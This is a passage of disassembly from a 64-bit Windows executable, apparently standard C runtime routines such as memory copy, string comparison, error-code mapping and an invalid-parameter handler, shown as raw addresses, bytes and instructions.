   140002b9c:	66 8b 04 0a          	mov    (%rdx,%rcx,1),%ax
   140002ba0:	49 83 e8 02          	sub    $0x2,%r8
   140002ba4:	66 89 01             	mov    %ax,(%rcx)
   140002ba7:	48 83 c1 02          	add    $0x2,%rcx
   140002bab:	f6 c1 04             	test   $0x4,%cl
   140002bae:	74 0d                	je     0x140002bbd
   140002bb0:	8b 04 0a             	mov    (%rdx,%rcx,1),%eax
   140002bb3:	49 83 e8 04          	sub    $0x4,%r8
   140002bb7:	89 01                	mov    %eax,(%rcx)
   140002bb9:	48 83 c1 04          	add    $0x4,%rcx
   140002bbd:	4d 8b c8             	mov    %r8,%r9
   140002bc0:	49 c1 e9 05          	shr    $0x5,%r9
   140002bc4:	75 51                	jne    0x140002c17
   140002bc6:	4d 8b c8             	mov    %r8,%r9
   140002bc9:	49 c1 e9 03          	shr    $0x3,%r9
   140002bcd:	74 14                	je     0x140002be3
   140002bcf:	48 8b 04 0a          	mov    (%rdx,%rcx,1),%rax
   140002bd3:	48 89 01             	mov    %rax,(%rcx)
   140002bd6:	48 83 c1 08          	add    $0x8,%rcx
   140002bda:	49 ff c9             	dec    %r9
   140002bdd:	75 f0                	jne    0x140002bcf
   140002bdf:	49 83 e0 07          	and    $0x7,%r8
   140002be3:	4d 85 c0             	test   %r8,%r8
   140002be6:	75 08                	jne    0x140002bf0
   140002be8:	49 8b c3             	mov    %r11,%rax
   140002beb:	c3                   	ret
   140002bec:	0f 1f 40 00          	nopl   0x0(%rax)
   140002bf0:	8a 04 0a             	mov    (%rdx,%rcx,1),%al
   140002bf3:	88 01                	mov    %al,(%rcx)
   140002bf5:	48 ff c1             	inc    %rcx
   140002bf8:	49 ff c8             	dec    %r8
   140002bfb:	75 f3                	jne    0x140002bf0
   140002bfd:	49 8b c3             	mov    %r11,%rax
   140002c00:	c3                   	ret
   140002c01:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140002c08:	0f 1f 84 00 00 00 00 
   140002c0f:	00 
   140002c10:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140002c14:	66 66 90             	data16 xchg %ax,%ax
   140002c17:	49 81 f9 00 20 00 00 	cmp    $0x2000,%r9
   140002c1e:	73 42                	jae    0x140002c62
   140002c20:	48 8b 04 0a          	mov    (%rdx,%rcx,1),%rax
   140002c24:	4c 8b 54 0a 08       	mov    0x8(%rdx,%rcx,1),%r10
   140002c29:	48 83 c1 20          	add    $0x20,%rcx
   140002c2d:	48 89 41 e0          	mov    %rax,-0x20(%rcx)
   140002c31:	4c 89 51 e8          	mov    %r10,-0x18(%rcx)
   140002c35:	48 8b 44 0a f0       	mov    -0x10(%rdx,%rcx,1),%rax
   140002c3a:	4c 8b 54 0a f8       	mov    -0x8(%rdx,%rcx,1),%r10
   140002c3f:	49 ff c9             	dec    %r9
   140002c42:	48 89 41 f0          	mov    %rax,-0x10(%rcx)
   140002c46:	4c 89 51 f8          	mov    %r10,-0x8(%rcx)
   140002c4a:	75 d4                	jne    0x140002c20
   140002c4c:	49 83 e0 1f          	and    $0x1f,%r8
   140002c50:	e9 71 ff ff ff       	jmp    0x140002bc6
   140002c55:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%rax,%rax,1)
   140002c5c:	00 00 00 00 
   140002c60:	66 90                	xchg   %ax,%ax
   140002c62:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   140002c69:	72 b5                	jb     0x140002c20
   140002c6b:	b8 20 00 00 00       	mov    $0x20,%eax
   140002c70:	0f 18 04 0a          	prefetchnta (%rdx,%rcx,1)
   140002c74:	0f 18 44 0a 40       	prefetchnta 0x40(%rdx,%rcx,1)
   140002c79:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   140002c80:	ff c8                	dec    %eax
   140002c82:	75 ec                	jne    0x140002c70
   140002c84:	48 81 e9 00 10 00 00 	sub    $0x1000,%rcx
   140002c8b:	b8 40 00 00 00       	mov    $0x40,%eax
   140002c90:	4c 8b 0c 0a          	mov    (%rdx,%rcx,1),%r9
   140002c94:	4c 8b 54 0a 08       	mov    0x8(%rdx,%rcx,1),%r10
   140002c99:	4c 0f c3 09          	movnti %r9,(%rcx)
   140002c9d:	4c 0f c3 51 08       	movnti %r10,0x8(%rcx)
   140002ca2:	4c 8b 4c 0a 10       	mov    0x10(%rdx,%rcx,1),%r9
   140002ca7:	4c 8b 54 0a 18       	mov    0x18(%rdx,%rcx,1),%r10
   140002cac:	4c 0f c3 49 10       	movnti %r9,0x10(%rcx)
   140002cb1:	4c 0f c3 51 18       	movnti %r10,0x18(%rcx)
   140002cb6:	4c 8b 4c 0a 20       	mov    0x20(%rdx,%rcx,1),%r9
   140002cbb:	4c 8b 54 0a 28       	mov    0x28(%rdx,%rcx,1),%r10
   140002cc0:	48 83 c1 40          	add    $0x40,%rcx
   140002cc4:	4c 0f c3 49 e0       	movnti %r9,-0x20(%rcx)
   140002cc9:	4c 0f c3 51 e8       	movnti %r10,-0x18(%rcx)
   140002cce:	4c 8b 4c 0a f0       	mov    -0x10(%rdx,%rcx,1),%r9
   140002cd3:	4c 8b 54 0a f8       	mov    -0x8(%rdx,%rcx,1),%r10
   140002cd8:	ff c8                	dec    %eax
   140002cda:	4c 0f c3 49 f0       	movnti %r9,-0x10(%rcx)
   140002cdf:	4c 0f c3 51 f8       	movnti %r10,-0x8(%rcx)
   140002ce4:	75 aa                	jne    0x140002c90
   140002ce6:	49 81 e8 00 10 00 00 	sub    $0x1000,%r8
   140002ced:	49 81 f8 00 10 00 00 	cmp    $0x1000,%r8
   140002cf4:	0f 83 71 ff ff ff    	jae    0x140002c6b
   140002cfa:	f0 80 0c 24 00       	lock orb $0x0,(%rsp)
   140002cff:	e9 b9 fe ff ff       	jmp    0x140002bbd
   140002d04:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140002d0b:	00 00 00 00 00 
   140002d10:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140002d14:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140002d18:	66 90                	xchg   %ax,%ax
   140002d1a:	49 03 c8             	add    %r8,%rcx
   140002d1d:	49 83 f8 08          	cmp    $0x8,%r8
   140002d21:	72 61                	jb     0x140002d84
   140002d23:	f6 c1 07             	test   $0x7,%cl
   140002d26:	74 36                	je     0x140002d5e
   140002d28:	f6 c1 01             	test   $0x1,%cl
   140002d2b:	74 0b                	je     0x140002d38
   140002d2d:	48 ff c9             	dec    %rcx
   140002d30:	8a 04 0a             	mov    (%rdx,%rcx,1),%al
   140002d33:	49 ff c8             	dec    %r8
   140002d36:	88 01                	mov    %al,(%rcx)
   140002d38:	f6 c1 02             	test   $0x2,%cl
   140002d3b:	74 0f                	je     0x140002d4c
   140002d3d:	48 83 e9 02          	sub    $0x2,%rcx
   140002d41:	66 8b 04 0a          	mov    (%rdx,%rcx,1),%ax
   140002d45:	49 83 e8 02          	sub    $0x2,%r8
   140002d49:	66 89 01             	mov    %ax,(%rcx)
   140002d4c:	f6 c1 04             	test   $0x4,%cl
   140002d4f:	74 0d                	je     0x140002d5e
   140002d51:	48 83 e9 04          	sub    $0x4,%rcx
   140002d55:	8b 04 0a             	mov    (%rdx,%rcx,1),%eax
   140002d58:	49 83 e8 04          	sub    $0x4,%r8
   140002d5c:	89 01                	mov    %eax,(%rcx)
   140002d5e:	4d 8b c8             	mov    %r8,%r9
   140002d61:	49 c1 e9 05          	shr    $0x5,%r9
   140002d65:	75 50                	jne    0x140002db7
   140002d67:	4d 8b c8             	mov    %r8,%r9
   140002d6a:	49 c1 e9 03          	shr    $0x3,%r9
   140002d6e:	74 14                	je     0x140002d84
   140002d70:	48 83 e9 08          	sub    $0x8,%rcx
   140002d74:	48 8b 04 0a          	mov    (%rdx,%rcx,1),%rax
   140002d78:	49 ff c9             	dec    %r9
   140002d7b:	48 89 01             	mov    %rax,(%rcx)
   140002d7e:	75 f0                	jne    0x140002d70
   140002d80:	49 83 e0 07          	and    $0x7,%r8
   140002d84:	4d 85 c0             	test   %r8,%r8
   140002d87:	75 07                	jne    0x140002d90
   140002d89:	49 8b c3             	mov    %r11,%rax
   140002d8c:	c3                   	ret
   140002d8d:	0f 1f 00             	nopl   (%rax)
   140002d90:	48 ff c9             	dec    %rcx
   140002d93:	8a 04 0a             	mov    (%rdx,%rcx,1),%al
   140002d96:	49 ff c8             	dec    %r8
   140002d99:	88 01                	mov    %al,(%rcx)
   140002d9b:	75 f3                	jne    0x140002d90
   140002d9d:	49 8b c3             	mov    %r11,%rax
   140002da0:	c3                   	ret
   140002da1:	66 66 66 66 66 66 66 	data16 data16 data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140002da8:	0f 1f 84 00 00 00 00 
   140002daf:	00 
   140002db0:	66 66 66 90          	data16 data16 xchg %ax,%ax
   140002db4:	66 66 90             	data16 xchg %ax,%ax
   140002db7:	49 81 f9 00 20 00 00 	cmp    $0x2000,%r9
   140002dbe:	73 42                	jae    0x140002e02
   140002dc0:	48 8b 44 0a f8       	mov    -0x8(%rdx,%rcx,1),%rax
   140002dc5:	4c 8b 54 0a f0       	mov    -0x10(%rdx,%rcx,1),%r10
   140002dca:	48 83 e9 20          	sub    $0x20,%rcx
   140002dce:	48 89 41 18          	mov    %rax,0x18(%rcx)
   140002dd2:	4c 89 51 10          	mov    %r10,0x10(%rcx)
   140002dd6:	48 8b 44 0a 08       	mov    0x8(%rdx,%rcx,1),%rax
   140002ddb:	4c 8b 14 0a          	mov    (%rdx,%rcx,1),%r10
   140002ddf:	49 ff c9             	dec    %r9
   140002de2:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140002de6:	4c 89 11             	mov    %r10,(%rcx)
   140002de9:	75 d5                	jne    0x140002dc0
   140002deb:	49 83 e0 1f          	and    $0x1f,%r8
   140002def:	e9 73 ff ff ff       	jmp    0x140002d67
   140002df4:	66 66 66 66 0f 1f 84 	data16 data16 data16 nopw 0x0(%rax,%rax,1)
   140002dfb:	00 00 00 00 00 
   140002e00:	66 90                	xchg   %ax,%ax
   140002e02:	48 81 fa 00 f0 ff ff 	cmp    $0xfffffffffffff000,%rdx
   140002e09:	77 b5                	ja     0x140002dc0
   140002e0b:	b8 20 00 00 00       	mov    $0x20,%eax
   140002e10:	48 81 e9 80 00 00 00 	sub    $0x80,%rcx
   140002e17:	0f 18 04 0a          	prefetchnta (%rdx,%rcx,1)
   140002e1b:	0f 18 44 0a 40       	prefetchnta 0x40(%rdx,%rcx,1)
   140002e20:	ff c8                	dec    %eax
   140002e22:	75 ec                	jne    0x140002e10
   140002e24:	48 81 c1 00 10 00 00 	add    $0x1000,%rcx
   140002e2b:	b8 40 00 00 00       	mov    $0x40,%eax
   140002e30:	4c 8b 4c 0a f8       	mov    -0x8(%rdx,%rcx,1),%r9
   140002e35:	4c 8b 54 0a f0       	mov    -0x10(%rdx,%rcx,1),%r10
   140002e3a:	4c 0f c3 49 f8       	movnti %r9,-0x8(%rcx)
   140002e3f:	4c 0f c3 51 f0       	movnti %r10,-0x10(%rcx)
   140002e44:	4c 8b 4c 0a e8       	mov    -0x18(%rdx,%rcx,1),%r9
   140002e49:	4c 8b 54 0a e0       	mov    -0x20(%rdx,%rcx,1),%r10
   140002e4e:	4c 0f c3 49 e8       	movnti %r9,-0x18(%rcx)
   140002e53:	4c 0f c3 51 e0       	movnti %r10,-0x20(%rcx)
   140002e58:	4c 8b 4c 0a d8       	mov    -0x28(%rdx,%rcx,1),%r9
   140002e5d:	4c 8b 54 0a d0       	mov    -0x30(%rdx,%rcx,1),%r10
   140002e62:	48 83 e9 40          	sub    $0x40,%rcx
   140002e66:	4c 0f c3 49 18       	movnti %r9,0x18(%rcx)
   140002e6b:	4c 0f c3 51 10       	movnti %r10,0x10(%rcx)
   140002e70:	4c 8b 4c 0a 08       	mov    0x8(%rdx,%rcx,1),%r9
   140002e75:	4c 8b 14 0a          	mov    (%rdx,%rcx,1),%r10
   140002e79:	ff c8                	dec    %eax
   140002e7b:	4c 0f c3 49 08       	movnti %r9,0x8(%rcx)
   140002e80:	4c 0f c3 11          	movnti %r10,(%rcx)
   140002e84:	75 aa                	jne    0x140002e30
   140002e86:	49 81 e8 00 10 00 00 	sub    $0x1000,%r8
   140002e8d:	49 81 f8 00 10 00 00 	cmp    $0x1000,%r8
   140002e94:	0f 83 71 ff ff ff    	jae    0x140002e0b
   140002e9a:	f0 80 0c 24 00       	lock orb $0x0,(%rsp)
   140002e9f:	e9 ba fe ff ff       	jmp    0x140002d5e
   140002ea4:	48 89 0d f5 1c 01 00 	mov    %rcx,0x11cf5(%rip)        # 0x140014ba0
   140002eab:	c3                   	ret
   140002eac:	40 53                	rex push %rbx
   140002eae:	48 81 ec e0 05 00 00 	sub    $0x5e0,%rsp
   140002eb5:	83 64 24 70 00       	andl   $0x0,0x70(%rsp)
   140002eba:	48 8d 4c 24 74       	lea    0x74(%rsp),%rcx
   140002ebf:	33 d2                	xor    %edx,%edx
   140002ec1:	41 b8 94 00 00 00    	mov    $0x94,%r8d
   140002ec7:	e8 a4 fb ff ff       	call   0x140002a70
   140002ecc:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   140002ed1:	48 8d 84 24 10 01 00 	lea    0x110(%rsp),%rax
   140002ed8:	00 
   140002ed9:	48 8d 8c 24 10 01 00 	lea    0x110(%rsp),%rcx
   140002ee0:	00 
   140002ee1:	4c 89 5c 24 48       	mov    %r11,0x48(%rsp)
   140002ee6:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   140002eeb:	ff 15 4f b2 00 00    	call   *0xb24f(%rip)        # 0x14000e140
   140002ef1:	48 8b 9c 24 08 02 00 	mov    0x208(%rsp),%rbx
   140002ef8:	00 
   140002ef9:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140002efe:	48 8b cb             	mov    %rbx,%rcx
   140002f01:	45 33 c0             	xor    %r8d,%r8d
   140002f04:	e8 d7 76 00 00       	call   0x14000a5e0
   140002f09:	48 85 c0             	test   %rax,%rax
   140002f0c:	74 3b                	je     0x140002f49
   140002f0e:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140002f14:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   140002f19:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140002f1e:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140002f23:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140002f28:	4c 8b c8             	mov    %rax,%r9
   140002f2b:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140002f30:	48 8d 8c 24 10 01 00 	lea    0x110(%rsp),%rcx
   140002f37:	00 
   140002f38:	4c 8b c3             	mov    %rbx,%r8
   140002f3b:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140002f40:	33 c9                	xor    %ecx,%ecx
   140002f42:	e8 93 76 00 00       	call   0x14000a5da
   140002f47:	eb 20                	jmp    0x140002f69
   140002f49:	48 8b 84 24 e8 05 00 	mov    0x5e8(%rsp),%rax
   140002f50:	00 
   140002f51:	48 89 84 24 08 02 00 	mov    %rax,0x208(%rsp)
   140002f58:	00 
   140002f59:	48 8d 84 24 e8 05 00 	lea    0x5e8(%rsp),%rax
   140002f60:	00 
   140002f61:	48 89 84 24 a8 01 00 	mov    %rax,0x1a8(%rsp)
   140002f68:	00 
   140002f69:	48 8b 84 24 e8 05 00 	mov    0x5e8(%rsp),%rax
   140002f70:	00 
   140002f71:	c7 44 24 70 17 04 00 	movl   $0xc0000417,0x70(%rsp)
   140002f78:	c0 
   140002f79:	c7 44 24 74 01 00 00 	movl   $0x1,0x74(%rsp)
   140002f80:	00 
   140002f81:	48 89 84 24 80 00 00 	mov    %rax,0x80(%rsp)
   140002f88:	00 
   140002f89:	ff 15 99 b1 00 00    	call   *0xb199(%rip)        # 0x14000e128
   140002f8f:	33 c9                	xor    %ecx,%ecx
   140002f91:	8b d8                	mov    %eax,%ebx
   140002f93:	ff 15 87 b1 00 00    	call   *0xb187(%rip)        # 0x14000e120
   140002f99:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140002f9e:	ff 15 74 b1 00 00    	call   *0xb174(%rip)        # 0x14000e118
   140002fa4:	85 c0                	test   %eax,%eax
   140002fa6:	75 0c                	jne    0x140002fb4
   140002fa8:	85 db                	test   %ebx,%ebx
   140002faa:	75 08                	jne    0x140002fb4
   140002fac:	8d 48 02             	lea    0x2(%rax),%ecx
   140002faf:	e8 0c 2e 00 00       	call   0x140005dc0
   140002fb4:	ff 15 56 b1 00 00    	call   *0xb156(%rip)        # 0x14000e110
   140002fba:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   140002fbf:	48 8b c8             	mov    %rax,%rcx
   140002fc2:	ff 15 40 b1 00 00    	call   *0xb140(%rip)        # 0x14000e108
   140002fc8:	48 81 c4 e0 05 00 00 	add    $0x5e0,%rsp
   140002fcf:	5b                   	pop    %rbx
   140002fd0:	c3                   	ret
   140002fd1:	cc                   	int3
   140002fd2:	cc                   	int3
   140002fd3:	cc                   	int3
   140002fd4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002fd9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140002fde:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140002fe3:	57                   	push   %rdi
   140002fe4:	48 83 ec 30          	sub    $0x30,%rsp
   140002fe8:	48 8b e9             	mov    %rcx,%rbp
   140002feb:	48 8b 0d ae 1b 01 00 	mov    0x11bae(%rip),%rcx        # 0x140014ba0
   140002ff2:	41 8b d9             	mov    %r9d,%ebx
   140002ff5:	49 8b f8             	mov    %r8,%rdi
   140002ff8:	48 8b f2             	mov    %rdx,%rsi
   140002ffb:	e8 a8 04 00 00       	call   0x1400034a8
   140003000:	48 85 c0             	test   %rax,%rax
   140003003:	74 1a                	je     0x14000301f
   140003005:	4c 8b 54 24 60       	mov    0x60(%rsp),%r10
   14000300a:	44 8b cb             	mov    %ebx,%r9d
   14000300d:	4c 8b c7             	mov    %rdi,%r8
   140003010:	48 8b d6             	mov    %rsi,%rdx
   140003013:	48 8b cd             	mov    %rbp,%rcx
   140003016:	4c 89 54 24 20       	mov    %r10,0x20(%rsp)
   14000301b:	ff d0                	call   *%rax
   14000301d:	eb 25                	jmp    0x140003044
   14000301f:	b9 02 00 00 00       	mov    $0x2,%ecx
   140003024:	e8 97 2d 00 00       	call   0x140005dc0
   140003029:	4c 8b 5c 24 60       	mov    0x60(%rsp),%r11
   14000302e:	44 8b cb             	mov    %ebx,%r9d
   140003031:	4c 8b c7             	mov    %rdi,%r8
   140003034:	48 8b d6             	mov    %rsi,%rdx
   140003037:	48 8b cd             	mov    %rbp,%rcx
   14000303a:	4c 89 5c 24 20       	mov    %r11,0x20(%rsp)
   14000303f:	e8 68 fe ff ff       	call   0x140002eac
   140003044:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140003049:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   14000304e:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   140003053:	48 83 c4 30          	add    $0x30,%rsp
   140003057:	5f                   	pop    %rdi
   140003058:	c3                   	ret
   140003059:	cc                   	int3
   14000305a:	cc                   	int3
   14000305b:	cc                   	int3
   14000305c:	4c 8d 0d fd ff 00 00 	lea    0xfffd(%rip),%r9        # 0x140013060
   140003063:	33 c0                	xor    %eax,%eax
   140003065:	49 8b d1             	mov    %r9,%rdx
   140003068:	44 8d 40 08          	lea    0x8(%rax),%r8d
   14000306c:	3b 0a                	cmp    (%rdx),%ecx
   14000306e:	74 2b                	je     0x14000309b
   140003070:	ff c0                	inc    %eax
   140003072:	49 03 d0             	add    %r8,%rdx
   140003075:	83 f8 2d             	cmp    $0x2d,%eax
   140003078:	72 f2                	jb     0x14000306c
   14000307a:	8d 41 ed             	lea    -0x13(%rcx),%eax
   14000307d:	83 f8 11             	cmp    $0x11,%eax
   140003080:	77 06                	ja     0x140003088
   140003082:	b8 0d 00 00 00       	mov    $0xd,%eax
   140003087:	c3                   	ret
   140003088:	81 c1 44 ff ff ff    	add    $0xffffff44,%ecx
   14000308e:	b8 16 00 00 00       	mov    $0x16,%eax
   140003093:	83 f9 0e             	cmp    $0xe,%ecx
   140003096:	41 0f 46 c0          	cmovbe %r8d,%eax
   14000309a:	c3                   	ret
   14000309b:	48 98                	cltq
   14000309d:	41 8b 44 c1 04       	mov    0x4(%r9,%rax,8),%eax
   1400030a2:	c3                   	ret
   1400030a3:	cc                   	int3
   1400030a4:	48 83 ec 28          	sub    $0x28,%rsp
   1400030a8:	e8 df 04 00 00       	call   0x14000358c
   1400030ad:	48 85 c0             	test   %rax,%rax
   1400030b0:	75 09                	jne    0x1400030bb
   1400030b2:	48 8d 05 0f 01 01 00 	lea    0x1010f(%rip),%rax        # 0x1400131c8
   1400030b9:	eb 04                	jmp    0x1400030bf
   1400030bb:	48 83 c0 10          	add    $0x10,%rax
   1400030bf:	48 83 c4 28          	add    $0x28,%rsp
   1400030c3:	c3                   	ret
   1400030c4:	48 83 ec 28          	sub    $0x28,%rsp
   1400030c8:	e8 bf 04 00 00       	call   0x14000358c
   1400030cd:	48 85 c0             	test   %rax,%rax
   1400030d0:	75 09                	jne    0x1400030db
   1400030d2:	48 8d 05 f3 00 01 00 	lea    0x100f3(%rip),%rax        # 0x1400131cc
   1400030d9:	eb 04                	jmp    0x1400030df
   1400030db:	48 83 c0 14          	add    $0x14,%rax
   1400030df:	48 83 c4 28          	add    $0x28,%rsp
   1400030e3:	c3                   	ret
   1400030e4:	40 53                	rex push %rbx
   1400030e6:	48 83 ec 20          	sub    $0x20,%rsp
   1400030ea:	8b d9                	mov    %ecx,%ebx
   1400030ec:	e8 9b 04 00 00       	call   0x14000358c
   1400030f1:	48 85 c0             	test   %rax,%rax
   1400030f4:	75 09                	jne    0x1400030ff
   1400030f6:	48 8d 05 cf 00 01 00 	lea    0x100cf(%rip),%rax        # 0x1400131cc
   1400030fd:	eb 04                	jmp    0x140003103
   1400030ff:	48 83 c0 14          	add    $0x14,%rax
   140003103:	89 18                	mov    %ebx,(%rax)
   140003105:	e8 82 04 00 00       	call   0x14000358c
   14000310a:	4c 8d 15 b7 00 01 00 	lea    0x100b7(%rip),%r10        # 0x1400131c8
   140003111:	48 85 c0             	test   %rax,%rax
   140003114:	74 04                	je     0x14000311a
   140003116:	4c 8d 50 10          	lea    0x10(%rax),%r10
   14000311a:	8b cb                	mov    %ebx,%ecx
   14000311c:	e8 3b ff ff ff       	call   0x14000305c
   140003121:	41 89 02             	mov    %eax,(%r10)
   140003124:	48 83 c4 20          	add    $0x20,%rsp
   140003128:	5b                   	pop    %rbx
   140003129:	c3                   	ret
   14000312a:	cc                   	int3
   14000312b:	cc                   	int3
   14000312c:	40 53                	rex push %rbx
   14000312e:	48 83 ec 30          	sub    $0x30,%rsp
   140003132:	48 8b d9             	mov    %rcx,%rbx
   140003135:	b9 0e 00 00 00       	mov    $0xe,%ecx
   14000313a:	e8 2d 0b 00 00       	call   0x140003c6c
   14000313f:	90                   	nop
   140003140:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140003144:	48 85 c0             	test   %rax,%rax
   140003147:	74 44                	je     0x14000318d
   140003149:	48 8b 0d 60 1a 01 00 	mov    0x11a60(%rip),%rcx        # 0x140014bb0
   140003150:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140003155:	48 8d 15 4c 1a 01 00 	lea    0x11a4c(%rip),%rdx        # 0x140014ba8
   14000315c:	48 85 c9             	test   %rcx,%rcx
   14000315f:	74 1e                	je     0x14000317f
   140003161:	48 39 01             	cmp    %rax,(%rcx)
   140003164:	75 0f                	jne    0x140003175
   140003166:	48 8b 41 08          	mov    0x8(%rcx),%rax
   14000316a:	48 89 42 08          	mov    %rax,0x8(%rdx)
   14000316e:	e8 a5 f8 ff ff       	call   0x140002a18
   140003173:	eb 0a                	jmp    0x14000317f
   140003175:	48 8b d1             	mov    %rcx,%rdx
   140003178:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000317d:	eb dd                	jmp    0x14000315c
   14000317f:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140003183:	e8 90 f8 ff ff       	call   0x140002a18
   140003188:	48 83 63 08 00       	andq   $0x0,0x8(%rbx)
   14000318d:	b9 0e 00 00 00       	mov    $0xe,%ecx
   140003192:	e8 d5 09 00 00       	call   0x140003b6c
   140003197:	48 83 c4 30          	add    $0x30,%rsp
   14000319b:	5b                   	pop    %rbx
   14000319c:	c3                   	ret
   14000319d:	cc                   	int3
   14000319e:	cc                   	int3
   14000319f:	cc                   	int3
   1400031a0:	cc                   	int3
   1400031a1:	cc                   	int3
   1400031a2:	cc                   	int3
   1400031a3:	cc                   	int3
   1400031a4:	cc                   	int3
   1400031a5:	cc                   	int3
   1400031a6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400031ad:	00 00 00 
   1400031b0:	48 2b d1             	sub    %rcx,%rdx
   1400031b3:	4c 8b ca             	mov    %rdx,%r9
   1400031b6:	f6 c1 07             	test   $0x7,%cl
   1400031b9:	74 1b                	je     0x1400031d6
   1400031bb:	8a 01                	mov    (%rcx),%al
   1400031bd:	42 8a 14 09          	mov    (%rcx,%r9,1),%dl
   1400031c1:	3a c2                	cmp    %dl,%al
   1400031c3:	75 56                	jne    0x14000321b
   1400031c5:	48 ff c1             	inc    %rcx
   1400031c8:	84 c0                	test   %al,%al
   1400031ca:	74 57                	je     0x140003223
   1400031cc:	48 f7 c1 07 00 00 00 	test   $0x7,%rcx
   1400031d3:	75 e6                	jne    0x1400031bb
   1400031d5:	90                   	nop
   1400031d6:	49 bb 00 01 01 01 01 	movabs $0x8101010101010100,%r11
   1400031dd:	01 01 81 
   1400031e0:	4a 8d 14 09          	lea    (%rcx,%r9,1),%rdx
   1400031e4:	66 81 e2 ff 0f       	and    $0xfff,%dx
   1400031e9:	66 81 fa f8 0f       	cmp    $0xff8,%dx
   1400031ee:	77 cb                	ja     0x1400031bb
   1400031f0:	48 8b 01             	mov    (%rcx),%rax
   1400031f3:	4a 8b 14 09          	mov    (%rcx,%r9,1),%rdx
   1400031f7:	48 3b c2             	cmp    %rdx,%rax
   1400031fa:	75 bf                	jne    0x1400031bb
   1400031fc:	49 ba ff fe fe fe fe 	movabs $0x7efefefefefefeff,%r10
   140003203:	fe fe 7e 
   140003206:	4c 03 d2             	add    %rdx,%r10
   140003209:	48 83 f0 ff          	xor    $0xffffffffffffffff,%rax
   14000320d:	48 83 c1 08          	add    $0x8,%rcx
   140003211:	49 33 c2             	xor    %r10,%rax
   140003214:	49 85 c3             	test   %rax,%r11
   140003217:	74 c7                	je     0x1400031e0
   140003219:	eb 0f                	jmp    0x14000322a
   14000321b:	48 1b c0             	sbb    %rax,%rax
   14000321e:	48 83 d8 ff          	sbb    $0xffffffffffffffff,%rax
   140003222:	c3                   	ret
   140003223:	33 c0                	xor    %eax,%eax
   140003225:	c3                   	ret
   140003226:	66 66 66 90          	data16 data16 xchg %ax,%ax
   14000322a:	84 d2                	test   %dl,%dl
   14000322c:	74 27                	je     0x140003255
   14000322e:	84 f6                	test   %dh,%dh
   140003230:	74 23                	je     0x140003255
   140003232:	48 c1 ea 10          	shr    $0x10,%rdx
   140003236:	84 d2                	test   %dl,%dl
   140003238:	74 1b                	je     0x140003255
   14000323a:	84 f6                	test   %dh,%dh
   14000323c:	74 17                	je     0x140003255
   14000323e:	48 c1 ea 10          	shr    $0x10,%rdx
   140003242:	84 d2                	test   %dl,%dl
   140003244:	74 0f                	je     0x140003255
   140003246:	84 f6                	test   %dh,%dh
   140003248:	74 0b                	je     0x140003255
   14000324a:	c1 ea 10             	shr    $0x10,%edx
   14000324d:	84 d2                	test   %dl,%dl
   14000324f:	74 04                	je     0x140003255
   140003251:	84 f6                	test   %dh,%dh
   140003253:	75 8b                	jne    0x1400031e0
   140003255:	33 c0                	xor    %eax,%eax
   140003257:	c3                   	ret
   140003258:	48 1b c0             	sbb    %rax,%rax
   14000325b:	48 83 d8 ff          	sbb    $0xffffffffffffffff,%rax
   14000325f:	c3                   	ret
   140003260:	40 53                	rex push %rbx
   140003262:	48 83 ec 20          	sub    $0x20,%rsp
   140003266:	ba 08 00 00 00       	mov    $0x8,%edx
   14000326b:	8d 4a 18             	lea    0x18(%rdx),%ecx
   14000326e:	e8 3d 2c 00 00       	call   0x140005eb0
   140003273:	48 8b c8             	mov    %rax,%rcx
   140003276:	48 8b d8             	mov    %rax,%rbx
   140003279:	e8 16 02 00 00       	call   0x140003494
   14000327e:	48 89 05 13 35 01 00 	mov    %rax,0x13513(%rip)        # 0x140016798
   140003285:	48 89 05 04 35 01 00 	mov    %rax,0x13504(%rip)        # 0x140016790
   14000328c:	48 85 db             	test   %rbx,%rbx
   14000328f:	75 05                	jne    0x140003296
   140003291:	8d 43 18             	lea    0x18(%rbx),%eax
   140003294:	eb 06                	jmp    0x14000329c
   140003296:	48 83 23 00          	andq   $0x0,(%rbx)
   14000329a:	33 c0                	xor    %eax,%eax
   14000329c:	48 83 c4 20          	add    $0x20,%rsp
   1400032a0:	5b                   	pop    %rbx
   1400032a1:	c3                   	ret
   1400032a2:	cc                   	int3
   1400032a3:	cc                   	int3
   1400032a4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400032a9:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   1400032ae:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400032b3:	41 54                	push   %r12
   1400032b5:	41 55                	push   %r13
   1400032b7:	41 56                	push   %r14
